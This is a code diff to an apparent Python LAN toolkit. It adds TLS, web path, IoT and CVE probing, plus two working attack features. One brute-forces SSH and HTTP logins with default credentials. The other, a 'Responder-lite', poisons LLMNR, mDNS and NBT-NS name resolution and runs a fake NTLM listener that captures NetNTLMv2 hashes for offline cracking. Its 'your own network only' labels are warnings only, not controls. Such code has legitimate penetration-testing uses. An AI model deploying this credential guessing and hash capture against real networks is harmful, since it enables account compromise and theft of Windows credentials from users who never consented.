@@ -335,6 +335,176 @@ def builtin_scan(ip):
         print(f"  {p:<6} open   {port_name(p)}")
 
 
+# ---- assessment helpers used by the host profile (items 5, 6, 11, 2) ----
+
+def tls_audit(ip, port=443):
+    """[5] TLS protocol support + certificate summary. Returns list of strings."""
+    import ssl, warnings
+    warnings.filterwarnings("ignore")      # quiet the TLSv1/1.1 deprecation notices
+    out = []
+    supported = []
+    for name, ver in [("TLSv1.0", getattr(ssl.TLSVersion, "TLSv1", None)),
+                      ("TLSv1.1", getattr(ssl.TLSVersion, "TLSv1_1", None)),
+                      ("TLSv1.2", ssl.TLSVersion.TLSv1_2),
+                      ("TLSv1.3", ssl.TLSVersion.TLSv1_3)]:
+        if ver is None:
+            continue
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        try:
+            ctx.minimum_version = ctx.maximum_version = ver
+        except ValueError:
+            continue
+        try:
+            with socket.create_connection((ip, port), timeout=4) as s:
+                with ctx.wrap_socket(s, server_hostname=ip):
+                    supported.append(name)
+        except Exception:
+            pass
+    if not supported:
+        return ["no TLS handshake (maybe not TLS on this port)"]
+    weak = [v for v in supported if v in ("TLSv1.0", "TLSv1.1")]
+    out.append("TLS: " + ", ".join(supported) + (f"   [WEAK: {', '.join(weak)}]" if weak else ""))
+    try:
+        import ssl as _ssl, datetime
+        from cryptography import x509
+        pem = _ssl.get_server_certificate((ip, port), timeout=5)
+        c = x509.load_pem_x509_certificate(pem.encode())
+        subj, iss = c.subject.rfc4514_string(), c.issuer.rfc4514_string()
+        exp = c.not_valid_after_utc
+        days = (exp - datetime.datetime.now(datetime.timezone.utc)).days
+        out.append(f"cert: {subj[:48]}")
+        out.append(f"  issuer {iss[:40]}" + ("  [SELF-SIGNED]" if subj == iss else ""))
+        out.append(f"  expires {exp.date()} ({days}d)" + ("  [EXPIRED]" if days < 0 else ""))
+    except Exception as e:
+        out.append(f"cert parse failed: {e}")
+    return out
+
+
+WEB_PATHS = ["admin", "login", "robots.txt", ".git/HEAD", ".env", "api", "config",
+             "backup", "phpmyadmin", "server-status", "wp-login.php", "dashboard"]
+
+
+def web_discover(ip, port, scheme="http"):
+    """[6] Probe common web paths. Detects catch-all/SPA servers (which return
+    200 for everything) to avoid false positives."""
+    import urllib.request, urllib.error, ssl, random
+    ctx = None
+    if scheme == "https":
+        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+
+    def code_for(path):
+        try:
+            req = urllib.request.Request(f"{scheme}://{ip}:{port}/{path}",
+                                         headers={"User-Agent": "lan-toolkit"})
+            r = urllib.request.urlopen(req, timeout=4, context=ctx)
+            return r.status
+        except urllib.error.HTTPError as e:
+            return e.code
+        except Exception:
+            return None
+
+    if code_for("nope-%d-zzz" % random.randint(1000, 9999)) == 200:
+        return ["  (server answers 200 for ALL paths - SPA/catch-all; discovery unreliable)"]
+    found = [f"  {c}  /{p}" for p in WEB_PATHS
+             for c in [code_for(p)] if c in (200, 301, 302, 401, 403)]
+    return found or ["  (no common paths found)"]
+
+
+def iot_probe(ip, open_ports):
+    """[11] Interact with IoT/service protocols on known ports. Returns list."""
+    out = []
+    if 554 in open_ports:
+        try:
+            with socket.create_connection((ip, 554), timeout=4) as s:
+                s.sendall(f"OPTIONS rtsp://{ip}:554 RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
+                resp = s.recv(512).decode("utf-8", "replace")
+            if "RTSP" in resp:
+                out.append(f"  RTSP camera: rtsp://{ip}:554/  (open in VLC: Media > Open Network Stream)")
+        except Exception:
+            pass
+    if 1883 in open_ports:
+        try:
+            pkt = bytes([0x10, 0x0c, 0x00, 0x04]) + b"MQTT" + bytes([0x04, 0x02, 0x00, 0x3c, 0x00, 0x00])
+            with socket.create_connection((ip, 1883), timeout=4) as s:
+                s.sendall(pkt); r = s.recv(4)
+            if r and r[0] == 0x20:
+                out.append(f"  MQTT broker open: {ip}:1883 (accepts anonymous connect)")
+        except Exception:
+            pass
+    if 80 in open_ports or 8080 in open_ports:
+        hp = 80 if 80 in open_ports else 8080
+        out.append(f"  HTTP UI: http://{ip}:{hp}/  (cameras often stream MJPEG here - opens in a browser)")
+    if 9100 in open_ports:
+        out.append(f"  Raw print (JetDirect): {ip}:9100")
+    if 631 in open_ports:
+        out.append(f"  IPP printer: http://{ip}:631/")
+    return out
+
+
+def vuln_lookup(query, max_results=3):
+    """[2] Look up CVEs for a service banner. Order of preference:
+       1. searchsploit (offline, version-aware) if installed
+       2. Shodan CVEDB  (free, no key, product-level) - the reliable default
+       3. NVD keyword   (free but 503-flaky without a key; set NVD_API_KEY to fix)
+    Returns list of strings."""
+    import re as _re, urllib.request, urllib.parse, json
+    q = (query or "").strip()
+    if not q:
+        return []
+
+    # 1. searchsploit (best when available)
+    ss = shutil.which("searchsploit")
+    if ss:
+        try:
+            out = subprocess.run([ss, q], capture_output=True, text=True, timeout=15).stdout
+            hits = [ln.strip() for ln in out.splitlines() if "|" in ln and "----" not in ln][:max_results]
+            if hits:
+                return ["  " + h for h in hits]
+        except Exception:
+            pass
+
+    # product keyword from the banner, e.g. "Apache/2.4.49" -> "apache"
+    m = _re.search(r"[A-Za-z][A-Za-z+_.-]{2,}", q)
+    product = (m.group(0) if m else q.split()[0]).lower().strip("._-")
+
+    # 2. Shodan CVEDB (no key, reliable)
+    try:
+        u = "https://cvedb.shodan.io/cves?product=%s&limit=%d" % (urllib.parse.quote(product), max_results)
+        d = json.load(urllib.request.urlopen(
+            urllib.request.Request(u, headers={"User-Agent": "lan-toolkit"}), timeout=12))
+        cves = d.get("cves", [])[:max_results]
+        if cves:
+            return [f"  {c.get('cve_id', '?')}  cvss={c.get('cvss', '?')}  (product={product})"
+                    for c in cves]
+    except Exception:
+        pass
+
+    # 3. NVD keyword fallback (flaky without a key)
+    url = ("https://services.nvd.nist.gov/rest/json/cves/2.0?resultsPerPage=%d&keywordSearch=%s"
+           % (max_results, urllib.parse.quote(q)))
+    req = urllib.request.Request(url, headers={"User-Agent": "lan-toolkit"})
+    key = os.environ.get("NVD_API_KEY")
+    if key:
+        req.add_header("apiKey", key)
+    try:
+        data = json.load(urllib.request.urlopen(req, timeout=12))
+    except Exception as e:
+        return [f"  (CVE lookup unavailable: {e}; product={product})"]
+    res = []
+    for item in data.get("vulnerabilities", [])[:max_results]:
+        cve = item.get("cve", {})
+        sev = "?"
+        for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
+            mm = cve.get("metrics", {}).get(k)
+            if mm:
+                sev = mm[0].get("cvssData", {}).get("baseSeverity") or str(mm[0].get("cvssData", {}).get("baseScore", "?"))
+                break
+        res.append(f"  {cve.get('id', '?')}  severity={sev}")
+    return res or ["  (no CVEs matched this banner)"]
+
+
 def step_portscan(net):
     choice = input(f"Target IP, 'all' for whole subnet, or blank to pick from a list: ").strip()
     if choice.lower() == "all":
@@ -363,13 +533,45 @@ def step_portscan(net):
     ports = scan_common(target)
     print(f"  MAC/vendor : {mac or '?'}  {vendor}")
     print(f"  Likely type: {device_type(vendor, ports)}")
+    banners = {}
     if ports:
         print("  Open ports :")
         for p in ports:
             banner = grab_banner(target, p)                 # [8] banner grab
+            banners[p] = banner
             print(f"    {p:<6} {port_name(p):<12}{banner}")
     else:
         print("  Open ports : none (typical phone/tablet client)")
+
+    # [5] TLS audit on HTTPS ports
+    for tp in (443, 8443):
+        if tp in ports:
+            print(f"\n  [TLS audit :{tp}]")
+            for ln in tls_audit(target, tp):
+                print(f"    {ln}")
+
+    # [11] IoT / service-protocol interaction
+    iot = iot_probe(target, ports)
+    if iot:
+        print("\n  [Services / IoT]")
+        for ln in iot:
+            print(ln)
+
+    # [2] CVE lookup for the most interesting banner (NVD free API / searchsploit)
+    cand = next((banners[p] for p in (80, 443, 22, 8080, 21) if banners.get(p)), "")
+    if cand:
+        print(f"\n  [CVE lookup] for: {cand[:50]}")
+        for ln in vuln_lookup(cand):
+            print(ln)
+
+    # [6] web content discovery (opt-in: noisier)
+    web_ports = [p for p in (80, 8080, 443, 8443) if p in ports]
+    if web_ports and input("\nProbe common web paths? [y/N]: ").strip().lower() == "y":
+        for wp in web_ports:
+            scheme = "https" if wp in (443, 8443) else "http"
+            print(f"\n  [web paths {scheme}:{wp}]")
+            for ln in web_discover(target, wp, scheme):
+                print(ln)
 
     # [7] OS fingerprint via nmap (needs admin/root for the raw probes)
     if nmap and input("\nRun OS fingerprint? (needs admin) [y/N]: ").strip().lower() == "y":
@@ -1210,6 +1412,175 @@ def step_dnsspoof(net, target=None, domain=None, redirect=None):
 
 
 # ----------------------------------------------------------------------
+# STEP 7 - CREDENTIAL TEST (default/weak creds)  YOUR OWN devices ONLY
+# ----------------------------------------------------------------------
+DEFAULT_CREDS = [("admin", "admin"), ("admin", "password"), ("admin", ""),
+                 ("root", "root"), ("root", "toor"), ("root", "admin"),
+                 ("user", "user"), ("admin", "1234"), ("pi", "raspberry")]
+
+
+def step_credtest(net):
+    print("\n[Step 7] CREDENTIAL TEST - default/weak creds  (YOUR OWN devices only)")
+    target = _pick_device(net, ipv6=False)
+    if not target:
+        return
+    ports = scan_common(target)
+    default = "ssh" if 22 in ports else ("http" if (80 in ports or 8080 in ports) else "ssh")
+    svc = input(f"Service to test (ssh/http) [{default}]: ").strip().lower() or default
+    print(f"Trying {len(DEFAULT_CREDS)} default creds against {target} ({svc}) ...")
+
+    if svc == "ssh":
+        try:
+            import paramiko
+        except ImportError:
+            print("  needs paramiko:  pip install paramiko"); return
+        import logging; logging.getLogger("paramiko").setLevel(logging.CRITICAL)
+        for u, p in DEFAULT_CREDS:
+            c = paramiko.SSHClient()
+            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            try:
+                c.connect(target, username=u, password=p, timeout=5,
+                          allow_agent=False, look_for_keys=False)
+                print(f"  *** SUCCESS: {u}:{p or '(blank)'} ***"); c.close(); return
+            except paramiko.AuthenticationException:
+                pass
+            except Exception as e:
+                print(f"  ssh error: {e}"); return
+            finally:
+                try: c.close()
+                except Exception: pass
+        print("  no default creds worked (good)")
+    elif svc == "http":
+        import urllib.request, urllib.error, base64
+        port = 80 if 80 in ports else 8080
+        got401 = False
+        for u, p in DEFAULT_CREDS:
+            try:
+                req = urllib.request.Request(f"http://{target}:{port}/")
+                req.add_header("Authorization", "Basic " +
+                               base64.b64encode(f"{u}:{p}".encode()).decode())
+                r = urllib.request.urlopen(req, timeout=4)
+                if r.status == 200 and got401:
+                    print(f"  *** SUCCESS: {u}:{p or '(blank)'} (HTTP 200) ***"); return
+            except urllib.error.HTTPError as e:
+                if e.code == 401:
+                    got401 = True
+            except Exception:
+                pass
+        print("  no default creds worked" + ("" if got401 else " (no HTTP basic-auth on this port)"))
+
+
+# ----------------------------------------------------------------------
+# STEP 8 - RESPONDER-lite: LLMNR/NBT-NS/mDNS poisoning + NTLM capture
+# ----------------------------------------------------------------------
+# Answers Windows name-resolution broadcasts with our IP, then an HTTP
+# listener demands NTLM auth and logs the NetNTLMv2 hash (hashcat -m 5600).
+# YOUR OWN network only. Hashes are saved to Downloads/responder-hashes.txt.
+def step_responder(net):
+    print("\n[Step 8] RESPONDER-lite - capture Windows auth hashes  (YOUR OWN network only)")
+    print("Poisons LLMNR/NBT-NS/mDNS name lookups -> our IP, then an HTTP listener")
+    print("challenges for NTLM and records NetNTLMv2 hashes (crack offline with hashcat).")
+    if not _is_admin():
+        print("\nNeeds admin/root (bind port 80 + sniff). Relaunching elevated...")
+        _relaunch_elevated(["--responder"])
+        return
+    try:
+        from scapy.all import sniff, sendp, Ether, IP, UDP, DNS, DNSRR, LLMNRResponse, conf
+    except ImportError:
+        print("  needs scapy: pip install scapy"); return
+
+    me = net["ip"]
+    hashlog = os.path.join(HOME, "Downloads", "responder-hashes.txt")
+    stop = threading.Event()
+
+    # --- name-poisoning sniffer (LLMNR 5355 / mDNS 5353) -> answer with our IP ---
+    def poison(pkt):
+        try:
+            if pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[DNS].qdcount > 0:
+                qname = pkt[DNS].qd.qname
+                dport = pkt[UDP].sport
+                # reply from us, claiming the queried name is at our IP
+                rsp = (Ether(dst=pkt[Ether].src) / IP(dst=pkt[IP].src, src=me) /
+                       UDP(sport=pkt[UDP].dport, dport=dport) /
+                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                           an=DNSRR(rrname=qname, type="A", ttl=30, rdata=me)))
+                sendp(rsp, verbose=0)
+        except Exception:
+            pass
+
+    def sniff_thread():
+        try:
+            sniff(filter="udp port 5355 or udp port 5353 or udp port 137",
+                  prn=poison, store=0, stop_filter=lambda p: stop.is_set())
+        except Exception as e:
+            print(f"  sniff stopped: {e}")
+
+    # --- minimal HTTP NTLM listener on :80 -> capture NetNTLMv2 ---
+    import socketserver, http.server, base64, struct, binascii
+
+    class NTLMHandler(http.server.BaseHTTPRequestHandler):
+        def log_message(self, *a):
+            pass
+
+        def do_GET(self):
+            auth = self.headers.get("Authorization", "")
+            if not auth.startswith("NTLM "):
+                self.send_response(401)
+                self.send_header("WWW-Authenticate", "NTLM")
+                self.end_headers(); return
+            blob = base64.b64decode(auth.split(" ", 1)[1])
+            if blob[8] == 1:   # Type 1 -> send Type 2 challenge
+                chal = b"\x11\x22\x33\x44\x55\x66\x77\x88"
+                t2 = (b"NTLMSSP\x00\x02\x00\x00\x00\x00\x00\x00\x00\x38\x00\x00\x00"
+                      b"\x05\x82\x89\x02" + chal + b"\x00" * 8 + b"\x00" * 8)
+                self.send_response(401)
+                self.send_header("WWW-Authenticate", "NTLM " + base64.b64encode(t2).decode())
+                self.end_headers(); return
+            if blob[8] == 3:   # Type 3 -> extract NetNTLMv2
+                try:
+                    hsh = _parse_ntlmv2(blob)
+                    if hsh:
+                        print(f"\n  *** CAPTURED NetNTLMv2: {hsh.split(':')[0]} ***")
+                        with open(hashlog, "a", encoding="utf-8") as f:
+                            f.write(hsh + "\n")
+                        print(f"      saved to {hashlog} (crack: hashcat -m 5600)")
+                except Exception as e:
+                    print(f"  parse error: {e}")
+            self.send_response(200); self.end_headers()
+            self.wfile.write(b"ok")
+
+    def _parse_ntlmv2(b):
+        def field(off):
+            ln = struct.unpack("<H", b[off:off + 2])[0]
+            poff = struct.unpack("<I", b[off + 4:off + 8])[0]
+            return b[poff:poff + ln]
+        lm = field(12); nt = field(20); dom = field(28); usr = field(36)
+        user = usr.decode("utf-16-le", "replace"); domain = dom.decode("utf-16-le", "replace")
+        nt_proof = binascii.hexlify(nt[:16]).decode()
+        blob2 = binascii.hexlify(nt[16:]).decode()
+        chal = "1122334455667788"
+        return f"{user}::{domain}:{chal}:{nt_proof}:{blob2}"
+
+    th = threading.Thread(target=sniff_thread, daemon=True); th.start()
+    try:
+        srv = socketserver.TCPServer(("0.0.0.0", 80), NTLMHandler)
+    except OSError as e:
+        print(f"  can't bind :80 ({e}). Is something using port 80?"); stop.set(); return
+    srv.timeout = 1
+    print("\nListening 60s. Trigger a Windows name lookup (e.g. open \\\\<typo> in Explorer).")
+    print("Ctrl+C to stop early.\n")
+    end = time.time() + 60
+    try:
+        while time.time() < end:
+            srv.handle_request()
+    except KeyboardInterrupt:
+        pass
+    finally:
+        stop.set(); srv.server_close()
+        print("\nStopped poisoning + listener.")
+
+
+# ----------------------------------------------------------------------
 # JSON baseline helpers (used by the auto report)
 # ----------------------------------------------------------------------
 def _load_json(path):
@@ -1238,6 +1609,8 @@ MENU = """
   4) Remote access helpers
   5) Intercept a device's traffic   (auto IPv4/IPv6, your own devices only)
   6) DNS spoof - redirect a domain  (your own devices only)
+  7) Credential test - default/weak creds  (your own devices only)
+  8) Responder - capture Windows auth hashes  (your own network only)
   q) Quit
 """
 
@@ -1362,7 +1735,7 @@ def run_menu(net):
     actions = {
         "1": step_discover, "2": step_portscan, "3": step_traffic,
         "4": step_remote, "5": step_intercept,
-        "6": step_dnsspoof,
+        "6": step_dnsspoof, "7": step_credtest, "8": step_responder,
     }
     while True:
         try:
@@ -1378,7 +1751,7 @@ def run_menu(net):
                     print(f"Error: {e}")
                 input("\n[Enter] to return to the menu ...")   # keep results on screen
             else:
-                print("Pick 1-6 or q.")
+                print("Pick 1-8 or q.")
         except KeyboardInterrupt:
             print("\nInterrupted - back to menu. (q to quit)")
 
@@ -1487,6 +1860,11 @@ def main():
         nxt = args[i + 1] if i + 1 < len(args) else None
         target = nxt if (nxt and ":" in nxt) else None
         step_ndp(net, target)
+        return
+
+    # --responder : LLMNR/NBT-NS/mDNS poisoning + NTLM capture (elevation relaunch)
+    if "--responder" in args:
+        step_responder(net)
         return
 
     # --dnsspoof <ip> [domain] [redirect-ip] : DNS spoof a device. With domain
